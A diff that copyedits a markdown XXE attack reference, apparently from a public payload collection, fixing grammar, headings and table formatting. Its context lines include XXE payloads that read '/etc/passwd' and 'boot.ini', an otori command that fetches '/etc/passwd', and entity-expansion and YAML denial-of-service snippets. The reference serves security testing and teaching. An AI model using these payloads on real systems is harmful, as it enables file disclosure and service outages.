@@ -2,10 +2,10 @@
 
 > An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
 
-**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.
+**Internal Entity**: If an entity is declared within a DTD it is called an internal entity.
 Syntax: `<!ENTITY entity_name "entity_value">`
 
-**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.
+**External Entity**: If an entity is declared outside a DTD it is called an external entity. Identified by `SYSTEM`.
 Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 ## Summary
@@ -19,9 +19,9 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
   - [XInclude attacks](#xinclude-attacks)
 - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
-- [Exploiting XXE to perform a deny of service](#exploiting-xxe-to-perform-a-deny-of-service)
+- [Exploiting XXE to perform a denial of service](#exploiting-xxe-to-perform-a-denial-of-service)
   - [Billion Laugh Attack](#billion-laugh-attack)
-  - [Yaml attack](#yaml-attack)
+  - [YAML attack](#yaml-attack)
   - [Parameters Laugh attack](#parameters-laugh-attack)
 - [Exploiting Error Based XXE](#exploiting-error-based-xxe)
    - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)
@@ -91,7 +91,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   ```
 - [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
   ```ps1
-  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
+  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
   ```
 
 ## Labs
@@ -145,14 +145,14 @@ We try to display the content of the file `/etc/passwd`.
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-  <!DOCTYPE foo [  
+  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
+<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
@@ -219,7 +219,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 ```
 
 
-## Exploiting XXE to perform a deny of service
+## Exploiting XXE to perform a denial of service
 
 :warning: : These attacks might kill the service or the server, do not use them on the production.
 
@@ -236,7 +236,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 <data>&a4;</data>
 ```
 
-### Yaml attack
+### YAML attack
 
 ```xml
 a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
@@ -491,7 +491,7 @@ XML parsers uses 4 methods to detect encoding:
 * XML declaration: `<?xml version="1.0" encoding="UTF-8"?>`
 
 | Encoding | BOM      | Example                             |              |
-|----------|----------|-------------------------------------|--------------|
+| -------- | -------- | ----------------------------------- | ------------ |
 | UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
 | UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
 | UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |
